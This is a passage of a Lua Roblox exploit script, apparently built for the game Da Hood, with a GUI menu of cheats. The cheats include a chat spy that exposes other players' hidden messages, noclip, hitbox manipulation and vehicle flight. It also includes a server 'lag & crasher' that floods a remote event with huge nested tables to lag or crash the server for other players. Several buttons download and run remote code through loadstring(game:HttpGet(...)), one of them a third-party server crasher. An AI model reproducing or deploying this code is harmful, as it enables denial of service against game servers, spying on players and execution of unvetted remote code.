     publicItalics = true
 }
 
 -- Customizing Log Output
 PrivateProperties = {
     Color = Color3.fromRGB(0,255,255); 
     Font = Enum.Font.SourceSansBold;
     TextSize = 18;
 }
 
     local StarterGui = game:GetService("StarterGui")
     local Players = game:GetService("Players")
     local player = Players.LocalPlayer
     local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
     local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
     local instance = (_G.chatSpyInstance or 0) + 1
     _G.chatSpyInstance = instance
 
     local function onChatted(p,msg)
         if _G.chatSpyInstance == instance then
             if p==player and msg:lower():sub(1,4)=="/spy" then
                 Config.enabled = not Config.enabled
                 wait(0.3)
                 PrivateProperties.Text = "{SPY "..(Config.enabled and "EN" or "DIS").."ABLED}"
                 StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
             elseif Config.enabled and (Config.spyOnMyself==true or p~=player) then
                 msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
                 local hidden = true
                 local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
                     if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and Config.public==false and Players[packet.FromSpeaker].Team==player.Team)) then
                         hidden = false
                     end
                 end)
                 wait(1)
                 conn:Disconnect()
                 if hidden and Config.enabled then
                     if Config.public then
                         saymsg:FireServer((Config.publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
                     else
                         PrivateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
                         StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
                     end
                 end
             end
         end
     end
     
     for _,p in ipairs(Players:GetPlayers()) do
         p.Chatted:Connect(function(msg) onChatted(p,msg) end)
     end
 
     Players.PlayerAdded:Connect(function(p)
         p.Chatted:Connect(function(msg) onChatted(p,msg) end)
     end)
 
     PrivateProperties.Text = "{SPY "..(Config.enabled and "EN" or "DIS").."ABLED}"
     StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
     local chatFrame = player.PlayerGui.Chat.Frame
     chatFrame.ChatChannelParentFrame.Visible = true
     chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
 end)
 
 dhscriptsSection:NewButton("Anti-Slow", "Permant on server(rejoin to take off)", function()
 game:GetService('RunService'):BindToRenderStep("Anti-Slow", 0 , function()
     if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed"):Destroy() end
     if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk"):Destroy() end
     if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoJumping") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoJumping"):Destroy() end
     if game.Players.LocalPlayer.Character.BodyEffects.Reload.Value == true then game.Players.LocalPlayer.Character.BodyEffects.Reload.Value = false
     end
     end)
 end)
 
 dhscriptsSection:NewButton("Ball Spin", "Permant on server(rejoin to take off)", function()
     local UserInputService = game:GetService("UserInputService")
     local RunService = game:GetService("RunService")
     local Camera = workspace.CurrentCamera
     
     local SPEED_MULTIPLIER = 50 --Change Speed Here
     local JUMP_POWER = 60
     local JUMP_GAP = 0.3
     
     local character = game.Players.LocalPlayer.Character
     
     for i,v in ipairs(character:GetDescendants()) do
        if v:IsA("BasePart") then
            v.CanCollide = false
        end
     end
     
     local ball = character.HumanoidRootPart
     ball.Shape = Enum.PartType.Ball
     ball.Size = Vector3.new(5,5,5)
     local humanoid = character:WaitForChild("Humanoid")
     local params = RaycastParams.new()
     params.FilterType = Enum.RaycastFilterType.Blacklist
     params.FilterDescendantsInstances = {character}
     
     local tc = RunService.RenderStepped:Connect(function(delta)
        ball.CanCollide = true
        humanoid.PlatformStand = true
     if UserInputService:GetFocusedTextBox() then return end
     if UserInputService:IsKeyDown("W") then
     ball.RotVelocity -= Camera.CFrame.RightVector * delta * SPEED_MULTIPLIER
     end
     if UserInputService:IsKeyDown("A") then
     ball.RotVelocity -= Camera.CFrame.LookVector * delta * SPEED_MULTIPLIER
     end
     if UserInputService:IsKeyDown("S") then
     ball.RotVelocity += Camera.CFrame.RightVector * delta * SPEED_MULTIPLIER
     end
     if UserInputService:IsKeyDown("D") then
     ball.RotVelocity += Camera.CFrame.LookVector * delta * SPEED_MULTIPLIER
     end
     --ball.RotVelocity = ball.RotVelocity - Vector3.new(0,ball.RotVelocity.Y/50,0)
     end)
     
     UserInputService.JumpRequest:Connect(function()
     local result = workspace:Raycast(
     ball.Position,
     Vector3.new(
     0,
     -((ball.Size.Y/2)+JUMP_GAP),
     0
     ),
     params
     )
     if result then
     ball.Velocity = ball.Velocity + Vector3.new(0,JUMP_POWER,0)
     end
     end)
     
     Camera.CameraSubject = ball
     humanoid.Died:Connect(function() tc:Disconnect() end)
 end)
 
 dhscriptsSection:NewButton("Small Hitbox", "Permant on server(rejoin to take off)", function()
     game.Players.LocalPlayer.Character.LeftUpperArm:Destroy()
     for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
         if (v:IsA("Part") or v:IsA("BasePart")) and (v.Name:find("Leg") or v.Name:find("Foot")) then
             v:Destroy()
     game.Players.LocalPlayer.Character.Head:BreakJoints()
     game.Players.LocalPlayer.Character.Head.Position = Vector3.new(0, 999999999999, 0)
     end
     end
 end)
 
 dhscriptsSection:NewButton("Full Bright + No Fog", "Permant on server(rejoin to take off)", function()
     if not _G.FullBrightExecuted then
 
         _G.FullBrightEnabled = false
     
         _G.NormalLightingSettings = {
             Brightness = game:GetService("Lighting").Brightness,
             ClockTime = game:GetService("Lighting").ClockTime,
             FogEnd = game:GetService("Lighting").FogEnd,
             GlobalShadows = game:GetService("Lighting").GlobalShadows,
             Ambient = game:GetService("Lighting").Ambient
         }
     
         game:GetService("Lighting"):GetPropertyChangedSignal("Brightness"):Connect(function()
             if game:GetService("Lighting").Brightness ~= 1 and game:GetService("Lighting").Brightness ~= _G.NormalLightingSettings.Brightness then
                 _G.NormalLightingSettings.Brightness = game:GetService("Lighting").Brightness
                 if not _G.FullBrightEnabled then
                     repeat
                         wait()
                     until _G.FullBrightEnabled
                 end
                 game:GetService("Lighting").Brightness = 1
             end
         end)
     
         game:GetService("Lighting"):GetPropertyChangedSignal("ClockTime"):Connect(function()
             if game:GetService("Lighting").ClockTime ~= 12 and game:GetService("Lighting").ClockTime ~= _G.NormalLightingSettings.ClockTime then
                 _G.NormalLightingSettings.ClockTime = game:GetService("Lighting").ClockTime
                 if not _G.FullBrightEnabled then
                     repeat
                         wait()
                     until _G.FullBrightEnabled
                 end
                 game:GetService("Lighting").ClockTime = 12
             end
         end)
     
         game:GetService("Lighting"):GetPropertyChangedSignal("FogEnd"):Connect(function()
             if game:GetService("Lighting").FogEnd ~= 786543 and game:GetService("Lighting").FogEnd ~= _G.NormalLightingSettings.FogEnd then
                 _G.NormalLightingSettings.FogEnd = game:GetService("Lighting").FogEnd
                 if not _G.FullBrightEnabled then
                     repeat
                         wait()
                     until _G.FullBrightEnabled
                 end
                 game:GetService("Lighting").FogEnd = 786543
             end
         end)
     
         game:GetService("Lighting"):GetPropertyChangedSignal("GlobalShadows"):Connect(function()
             if game:GetService("Lighting").GlobalShadows ~= false and game:GetService("Lighting").GlobalShadows ~= _G.NormalLightingSettings.GlobalShadows then
                 _G.NormalLightingSettings.GlobalShadows = game:GetService("Lighting").GlobalShadows
                 if not _G.FullBrightEnabled then
                     repeat
                         wait()
                     until _G.FullBrightEnabled
                 end
                 game:GetService("Lighting").GlobalShadows = false
             end
         end)
     
         game:GetService("Lighting"):GetPropertyChangedSignal("Ambient"):Connect(function()
             if game:GetService("Lighting").Ambient ~= Color3.fromRGB(178, 178, 178) and game:GetService("Lighting").Ambient ~= _G.NormalLightingSettings.Ambient then
                 _G.NormalLightingSettings.Ambient = game:GetService("Lighting").Ambient
                 if not _G.FullBrightEnabled then
                     repeat
                         wait()
                     until _G.FullBrightEnabled
                 end
                 game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
             end
         end)
     
         game:GetService("Lighting").Brightness = 1
         game:GetService("Lighting").ClockTime = 12
         game:GetService("Lighting").FogEnd = 786543
         game:GetService("Lighting").GlobalShadows = false
         game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
     
         local LatestValue = true
         spawn(function()
             repeat
                 wait()
             until _G.FullBrightEnabled
             while wait() do
                 if _G.FullBrightEnabled ~= LatestValue then
                     if not _G.FullBrightEnabled then
                         game:GetService("Lighting").Brightness = _G.NormalLightingSettings.Brightness
                         game:GetService("Lighting").ClockTime = _G.NormalLightingSettings.ClockTime
                         game:GetService("Lighting").FogEnd = _G.NormalLightingSettings.FogEnd
                         game:GetService("Lighting").GlobalShadows = _G.NormalLightingSettings.GlobalShadows
                         game:GetService("Lighting").Ambient = _G.NormalLightingSettings.Ambient
                     else
                         game:GetService("Lighting").Brightness = 1
                         game:GetService("Lighting").ClockTime = 12
                         game:GetService("Lighting").FogEnd = 786543
                         game:GetService("Lighting").GlobalShadows = false
                         game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
                     end
                     LatestValue = not LatestValue
                 end
             end
         end)
     end
     
     _G.FullBrightExecuted = true
     _G.FullBrightEnabled = not _G.FullBrightEnabled
 end)
 
 dhscriptsSection:NewButton("Bike Fly", "Bike Fly", function()
     local speed = 20
     local old
     local Plr = game.Players.LocalPlayer
     local wheels = {}
     local control = {q=false,e=false,w=false,a=false,s=false,d=false}
     local Mouse = Plr:GetMouse()
 
     Mouse.KeyDown:connect(function(KEY)
         local key = KEY:lower()
         if control[key] ~= nil then
             control[key]=true
         end
     end)
 
     Mouse.KeyUp:connect(function(KEY)
         local key = KEY:lower()
         if control[key] ~= nil then
             control[key]=false
         end
     end)
 
     while game.RunService.Stepped:wait() do
         local seat = (Plr.Character or Plr.CharacterAdded:wait()):WaitForChild("Humanoid").SeatPart
         if Plr.PlayerGui:FindFirstChild("MainScreenGui") and Plr.PlayerGui.MainScreenGui:FindFirstChild("Bar") and Plr.PlayerGui.MainScreenGui.Bar:FindFirstChild("Speed") then
             Plr.PlayerGui.MainScreenGui.Bar.Speed.bar.Size = UDim2.new(speed / 100 * 0.95, 0, 0.83, 0)
         else
             local c = Plr.PlayerGui.MainScreenGui.Bar.HP
             local g = c:Clone()
             g.Name = "Speed"
             g.Position = UDim2.new(0.5, 0, 1, -120)
             g.bar.BackgroundColor3 = Color3.fromRGB(255, 155, 0)
             g.Picture.Image.Image = "rbxassetid://181035717"
             g.TextLabel.Text = "Speed"
             g.Parent = c.Parent
         end
         if seat ~= nil and seat:IsDescendantOf(game.Workspace.Vehicles) then
             if seat ~= old then
                 if old then
                     old.Vel:Destroy()
                     old.Gyro:Destroy()
                 end
                 old = seat
                 for i = 1, 2 do
                     if wheels[i] then
                         wheels[i][2].Parent = wheels[i][1]
                     end
                     local wheel = seat.Parent.Wheel
                     wheels[i] = {seat.Parent, wheel}
                     wheel:remove()
                 end
                 local gyro = Instance.new("BodyGyro", seat)
                 gyro.Name = "Gyro"
                 local pos = Instance.new("BodyVelocity", seat)
                 pos.Name = "Vel"
                 gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9)
                 pos.MaxForce = Vector3.new(9e9, 9e9, 9e9)
             else 
                 seat.Gyro.cframe = workspace.CurrentCamera.CoordinateFrame
                 local vel = CFrame.new(0, 0, 0)
                 if control.w then
                     vel = vel * CFrame.new(0, 0, -speed)
                 end
                 if control.s then
                     vel = vel * CFrame.new(0, 0, speed)
                 end
                 if control.a then
                     vel = vel * CFrame.new(-speed, 0, 0)
                 end
                 if control.d then
                     vel = vel * CFrame.new(speed, 0, 0)
                 end
                 seat.Vel.Velocity = (seat.CFrame*vel).p - seat.CFrame.p
             end
         end
         if control.e and speed<100 then
             speed = speed + 1
         end
         if control.q and speed > 0 then
             speed = speed - 1
         end
     end
 end)
 
 dhscriptsSection:NewButton("Noclip", "Permant on server(rejoin to take off)", function()
 local Noclip = nil
 local Clip = nil
 
 function noclip()
     Clip = false
     local function Nocl()
         if Clip == false and game.Players.LocalPlayer.Character ~= nil then
             for _,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                 if v:IsA('BasePart') and v.CanCollide and v.Name ~= floatName then
                     v.CanCollide = false
                 end
             end
         end
         wait(0.21) -- basic optimization
     end
     Noclip = game:GetService('RunService').Stepped:Connect(Nocl)
 end
 
 function clip()
     if Noclip then Noclip:Disconnect() end
     Clip = true
 end
 
 noclip() -- to toggle noclip() and clip()
 end)
 
 -- lagCrasher
 local lagCrasher = Window:NewTab("lag & Crasher script")
 local lagCrasherSection = lagCrasher:NewSection("lag and Crasher script")
 
 lagCrasherSection:NewButton("Lag Your Roblox Game", "it should lag other players too!", function()
     while wait(0.6) do --// don't change it's the best
         game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
         local function getmaxvalue(val)
            local mainvalueifonetable = 499999
            if type(val) ~= "number" then
                return nil
            end
            local calculateperfectval = (mainvalueifonetable/(val+2))
            return calculateperfectval
         end
         
         local function bomb(tableincrease, tries)
         local maintable = {}
         local spammedtable = {}
         
         table.insert(spammedtable, {})
         z = spammedtable[1]
         
         for i = 1, tableincrease do
             local tableins = {}
             table.insert(z, tableins)
             z = tableins
         end
         
         local calculatemax = getmaxvalue(tableincrease)
         local maximum
         
         if calculatemax then
              maximum = calculatemax
              else
              maximum = 999999
         end
         
         for i = 1, maximum do
              table.insert(maintable, spammedtable)
         end
         
         for i = 1, tries do
              game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
         end
         end
         
         bomb(250, 2) --// change values if client crashes
         end
 end)
 
 lagCrasherSection:NewButton("(Not my script) Crash Your Dh server", "(BDH, Betterdahood script)", function()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/BetterDaHood/BetterDaHoodCrasher/main/Crash'))()
 end)
 
 -- Fun Stuff
 local FunStuff = Window:NewTab("FunStuff")
 local FunStuffSection = FunStuff:NewSection("FunStuff")
 
 FunStuffSection:NewButton("Faded", "V To Toggle", function()
     _G.Toggles = "V"
     loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded/main/YesEpic", true))()
 end)
 
 FunStuffSection:NewButton("Swagmode", "Swagmode", function()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))()
 end)
 
 FunStuffSection:NewButton("Chat Translator", "...", function()
     wait(10)
 loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/x114/RobloxScripts/main/UpdatedChatTranslator"))()
 --[[ local languages = {
         auto = "Automatic",
         af = "Afrikaans",
         sq = "Albanian",
         am = "Amharic",
         ar = "Arabic",
         hy = "Armenian",
         az = "Azerbaijani",
         eu = "Basque",
         be = "Belarusian",
         bn = "Bengali",
         bs = "Bosnian",
         bg = "Bulgarian",
         ca = "Catalan",
         ceb = "Cebuano",
         ny = "Chichewa",
         ['zh-cn'] = "Chinese Simplified",
         ['zh-tw'] = "Chinese Traditional",
         co = "Corsican",
         hr = "Croatian",
         cs = "Czech",
         da = "Danish",
         nl = "Dutch",
         en = "English",
         eo = "Esperanto",
         et = "Estonian",
         tl = "Filipino",
         fi = "Finnish",
         fr = "French",
         fy = "Frisian",
         gl = "Galician",
         ka = "Georgian",
         de = "German",
         el = "Greek",
         gu = "Gujarati",
         ht = "Haitian Creole",
         ha = "Hausa",
         haw = "Hawaiian",
         iw = "Hebrew",
         hi = "Hindi",
         hmn = "Hmong",
         hu = "Hungarian",
         is = "Icelandic",
         ig = "Igbo",
         id = "Indonesian",
         ga = "Irish",
         it = "Italian",
         ja = "Japanese",
         jw = "Javanese",
         kn = "Kannada",
         kk = "Kazakh",
         km = "Khmer",
         ko = "Korean",
         ku = "Kurdish (Kurmanji)",
         ky = "Kyrgyz",
         lo = "Lao",
         la = "Latin",
         lv = "Latvian",
         lt = "Lithuanian",
         lb = "Luxembourgish",
         mk = "Macedonian",
         mg = "Malagasy",
         ms = "Malay",
         ml = "Malayalam",
         mt = "Maltese",
         mi = "Maori",
         mr = "Marathi",
         mn = "Mongolian",
         my = "Myanmar (Burmese)",
         ne = "Nepali",
         no = "Norwegian",
         ps = "Pashto",
         fa = "Persian",
         pl = "Polish",
         pt = "Portuguese",
         pa = "Punjabi",
         ro = "Romanian",
         ru = "Russian",
         sm = "Samoan",
         gd = "Scots Gaelic",
         sr = "Serbian",
         st = "Sesotho",
         sn = "Shona",
         sd = "Sindhi",
         si = "Sinhala",
         sk = "Slovak",
         sl = "Slovenian",
         so = "Somali",
         es = "Spanish",
         su = "Sundanese",
         sw = "Swahili",
         sv = "Swedish",
         tg = "Tajik",
         ta = "Tamil",
         te = "Telugu",
         th = "Thai",
         tr = "Turkish",
         uk = "Ukrainian",
         ur = "Urdu",
         uz = "Uzbek",
         vi = "Vietnamese",
         cy = "Welsh",
         xh = "Xhosa",
         yi = "Yiddish",
         yo = "Yoruba",
         zu = "Zulu"]]
 end)
 
 FunStuffSection:NewButton("infinity Yield (READ DESCRIPTION)>", "MUST USE WITH ANTICHEAT IN DHSCRIPTS", function()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
 end)
 
 FunStuffSection:NewButton("Rizzler", "Messi is better", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/mikhailramlal/Rizzer/main/main"))()
 end)
 
 FunStuffSection:NewButton("GodMacro", "Fake Macro", function()
     if game.PlaceId == 2788229376 then
         if getgenv().L_15 == true then
             game.StarterGui:SetCore("SendNotification", {
                 Title = "Speed Glitch";
                 Text = "Already Executed";
             })
             return
         end
         getgenv().L_15 = true -- dont change me
         
         getgenv().Notification = true
         getgenv().AutoMacro = true
         getgenv().Macro = true
         getgenv().AutoMacroKey = Enum.KeyCode.Z
         getgenv().MacroKey = Enum.KeyCode.X
         getgenv().MacroMode = "Mouse" -- Keyboard, Mouse
         getgenv().GodMacro = true
         getgenv().GodMacroKey = Enum.KeyCode.C
         getgenv().GodMacroAuto = false
     
         if AutoMacro == true then
             game:GetService("UserInputService").InputBegan:Connect(function(input, chatting)
                 if input.UserInputType == Enum.UserInputType.Keyboard then
                     if chatting then
                         IsChatting = true
                     else
                         IsChatting = false
                     end
                     if input.KeyCode == AutoMacroKey then
                         if IsChatting ~= false then
                             return
                         end
                         if not AutoMacroToggle then
                             if Notification == true then
                                 game.StarterGui:SetCore("SendNotification", {
                                     Title = "AutoMacro";
                                     Text = "AutoMacro: On";
                                 })
                             end
                             AutoMacroToggle = true
                             Instance.new("Animation", game:GetService("ReplicatedStorage"):findFirstChild("ClientAnimations")).Name = 'Greet'
                             game:GetService("ReplicatedStorage"):findFirstChild("ClientAnimations"):findFirstChild("Greet").AnimationId = 'rbxassetid://3189777795'
                             local Greet = game.ReplicatedStorage.ClientAnimations.Greet
                             local Humanoid = game.Players.LocalPlayer.Character.Humanoid
                             local Animation = Humanoid:LoadAnimation(Greet)
                             Animation:Play()
                             wait(1.6)
                             for i, v in next, game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
                                 if v:IsA("Tool") and v.Name ~= "Combat" or v.Name ~= "[Boombox]" then
                                     game:GetService("Players").LocalPlayer.Character:findFirstChildOfClass'Humanoid':EquipTool(v)
                                 end
                             end
                             wait()
                             game:GetService("VirtualInputManager"):SendKeyEvent(true, "S", false, game)
                             spawn(function()
                                 if MacroMode == "Keyboard" then
                                     while AutoMacroToggle == true do
                                         wait()
                                         game:GetService("VirtualInputManager"):SendKeyEvent(true, "I", false, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendKeyEvent(true, "O", false, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendKeyEvent(true, "I", false, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendKeyEvent(true, "O", false, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendKeyEvent(true, "I", false, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendKeyEvent(true, "O", false, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendKeyEvent(true, "I", false, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendKeyEvent(true, "O", false, game)
                                         wait()
                                     end
                                 elseif MacroMode == "Mouse" then
                                     while AutoMacroToggle == true do
                                         wait()
                                         game:GetService("VirtualInputManager"):SendMouseWheelEvent("0", "0", true, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendMouseWheelEvent("0", "0", false, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendMouseWheelEvent("0", "0", true, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendMouseWheelEvent("0", "0", false, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendMouseWheelEvent("0", "0", true, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendMouseWheelEvent("0", "0", false, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendMouseWheelEvent("0", "0", true, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendMouseWheelEvent("0", "0", false, game)
                                         wait()
                                     end
                                 end
                             end)
                             Animation:Stop()
                             Macro =
                                 game:service'Players'.LocalPlayer.Character:findFirstChildOfClass'Humanoid'.Running:Connect(function()
                                     Animation:Stop()
                                 end)
                         else
                             if Notification == true then
                                 game.StarterGui:SetCore("SendNotification", {
                                     Title = "AutoMacro";
                                     Text = "AutoMacro: Off";
                                 })
                             end
                             AutoMacroToggle = false
                             local Greet = game.ReplicatedStorage.ClientAnimations.Greet
                             local Humanoid = game.Players.LocalPlayer.Character.Humanoid
                             local Animation = Humanoid:LoadAnimation(Greet)
                             Animation:Stop()
                             game:GetService("ReplicatedStorage"):findFirstChild("ClientAnimations"):findFirstChild("Greet"):Remove()
                             Macro:Disconnect()
                         end
                     end
                 end
             end)
         end
     
         if Macro == true then
             game:GetService("UserInputService").InputBegan:Connect(function(input, chatting)
                 if input.UserInputType == Enum.UserInputType.Keyboard then
                     if chatting then
                         IsChatting = true
                     else
                         IsChatting = false
                     end
                     if input.KeyCode == MacroKey then
                         if IsChatting ~= false then
                             return
                         end
                         if not MacroToggle then
                             if Notification == true then
                                 game.StarterGui:SetCore("SendNotification", {
                                     Title = "Macro";
                                     Text = "Macro: On";
                                 })
                             end
                             MacroToggle = true
                             spawn(function()
                                 if MacroMode == "Keyboard" then
                                     while MacroToggle == true do
                                         wait()
                                         game:GetService("VirtualInputManager"):SendKeyEvent(true, "I", false, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendKeyEvent(true, "O", false, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendKeyEvent(true, "I", false, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendKeyEvent(true, "O", false, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendKeyEvent(true, "I", false, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendKeyEvent(true, "O", false, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendKeyEvent(true, "I", false, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendKeyEvent(true, "O", false, game)
                                         wait()
                                     end
                                 elseif MacroMode == "Mouse" then
                                     while MacroToggle == true do
                                         wait()
                                         game:GetService("VirtualInputManager"):SendMouseWheelEvent("0", "0", true, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendMouseWheelEvent("0", "0", false, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendMouseWheelEvent("0", "0", true, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendMouseWheelEvent("0", "0", false, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendMouseWheelEvent("0", "0", true, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendMouseWheelEvent("0", "0", false, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendMouseWheelEvent("0", "0", true, game)
                                         wait()
                                         game:GetService("VirtualInputManager"):SendMouseWheelEvent("0", "0", false, game)
                                         wait()
                                     end
                                 end
                             end)
                         else
                             if Notification == true then
                                 game.StarterGui:SetCore("SendNotification", {
                                     Title = "Macro";
                                     Text = "Macro: Off";
                                 })
                                 MacroToggle = false
                             end
                         end
                     end
                 end
             end)
         end
         if GodMacro == true then
             game:GetService("UserInputService").InputBegan:Connect(function(input, chatting)
                 if input.UserInputType == Enum.UserInputType.Keyboard then
                     if chatting then
                         IsChatting = true
                     else
                         IsChatting = false
                     end
                     if input.KeyCode == GodMacroKey then
                         if IsChatting ~= false then
                             return
                         end
                         if not GodMacroToggle then
                             if Notification == true then
                                 game.StarterGui:SetCore("SendNotification", {
                                     Title = "GodMacro";
                                     Text = "GodMacro: On";
                                 })
                             end
                             GodMacroToggle = true
                             if GodMacroAuto == true then
                                 Instance.new("Animation", game:GetService("ReplicatedStorage"):findFirstChild("ClientAnimations")).Name = 'Greet'
                                 game:GetService("ReplicatedStorage"):findFirstChild("ClientAnimations"):findFirstChild("Greet").AnimationId = 'rbxassetid://3189777795'
                                 local Greet = game.ReplicatedStorage.ClientAnimations.Greet
                                 local Humanoid = game.Players.LocalPlayer.Character.Humanoid
                                 local Animation = Humanoid:LoadAnimation(Greet)
                                 Animation:Play()
                                 wait(1.6)
                                 for i, v in next, game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
                                     if v:IsA("Tool") and v.Name ~= "Combat" or v.Name ~= "[Boombox]" then
                                         game:GetService("Players").LocalPlayer.Character:findFirstChildOfClass'Humanoid':EquipTool(v)
                                     end
                                 end
                                 wait()
                                 game:GetService("VirtualInputManager"):SendKeyEvent(true, "S", false, game)
                             end
                             spawn(function()
                                 if MacroMode == "Keyboard" then
                                     while GodMacroToggle == true do
                                         game:GetService("RunService").Heartbeat:wait()
                                         game:GetService("VirtualInputManager"):SendKeyEvent(true, "I", false, game)
                                         game:GetService("RunService").Heartbeat:wait()
                                         game:GetService("VirtualInputManager"):SendKeyEvent(true, "O", false, game)
                                         game:GetService("RunService").Heartbeat:wait()
                                         game:GetService("VirtualInputManager"):SendKeyEvent(true, "I", false, game)
                                         game:GetService("RunService").Heartbeat:wait()
                                         game:GetService("VirtualInputManager"):SendKeyEvent(true, "O", false, game)
                                         game:GetService("RunService").Heartbeat:wait()
                                         game:GetService("VirtualInputManager"):SendKeyEvent(true, "I", false, game)
                                         game:GetService("RunService").Heartbeat:wait()
                                         game:GetService("VirtualInputManager"):SendKeyEvent(true, "O", false, game)
                                         game:GetService("RunService").Heartbeat:wait()
                                         game:GetService("VirtualInputManager"):SendKeyEvent(true, "I", false, game)
                                         game:GetService("RunService").Heartbeat:wait()
                                         game:GetService("VirtualInputManager"):SendKeyEvent(true, "O", false, game)
                                         game:GetService("RunService").Heartbeat:wait()
                                     end
                                 elseif MacroMode == "Mouse" then
                                     while GodMacroToggle == true do
                                         game:GetService("RunService").Heartbeat:wait()
                                         game:GetService("VirtualInputManager"):SendMouseWheelEvent("0", "0", true, game)
                                         game:GetService("RunService").Heartbeat:wait()
                                         game:GetService("VirtualInputManager"):SendMouseWheelEvent("0", "0", false, game)
                                         game:GetService("RunService").Heartbeat:wait()
                                         game:GetService("VirtualInputManager"):SendMouseWheelEvent("0", "0", true, game)
                                         game:GetService("RunService").Heartbeat:wait()
                                         game:GetService("VirtualInputManager"):SendMouseWheelEvent("0", "0", false, game)
                                         game:GetService("RunService").Heartbeat:wait()
                                         game:GetService("VirtualInputManager"):SendMouseWheelEvent("0", "0", true, game)
                                         game:GetService("RunService").Heartbeat:wait()
                                         game:GetService("VirtualInputManager"):SendMouseWheelEvent("0", "0", false, game)
                                         game:GetService("RunService").Heartbeat:wait()
                                         game:GetService("VirtualInputManager"):SendMouseWheelEvent("0", "0", true, game)
                                         game:GetService("RunService").Heartbeat:wait()
                                         game:GetService("VirtualInputManager"):SendMouseWheelEvent("0", "0", false, game)
                                         game:GetService("RunService").Heartbeat:wait()
                                     end
                                 end
                             end)
                             if GodMacroAuto == true then
                                 Animation:Stop()
                                 Macro =
                                     game:service'Players'.LocalPlayer.Character:findFirstChildOfClass'Humanoid'.Running:Connect(function()
                                         Animation:Stop()
                                     end)
                             end
                         else
                             if Notification == true then
                                 game.StarterGui:SetCore("SendNotification", {
                                     Title = "GodMacro";
                                     Text = "GodMacro: Off";
                                 })
                                 GodMacroToggle = false
                                 if GodMacroAuto == true then
                                     local Greet = game.ReplicatedStorage.ClientAnimations.Greet
                                     local Humanoid = game.Players.LocalPlayer.Character.Humanoid
                                     local Animation = Humanoid:LoadAnimation(Greet)
                                     Animation:Stop()
                                     game:GetService("ReplicatedStorage"):findFirstChild("ClientAnimations"):findFirstChild("Greet"):Remove()
                                     Macro:Disconnect()
                                 end
                             end
                         end
                     end
                 end
             end)
         end
     end 
 end)

 -- Credits
 local Credits = Window:NewTab("Credits")
 local CreditsSection = Credits:NewSection("Script created by spidermanw#5854")
 
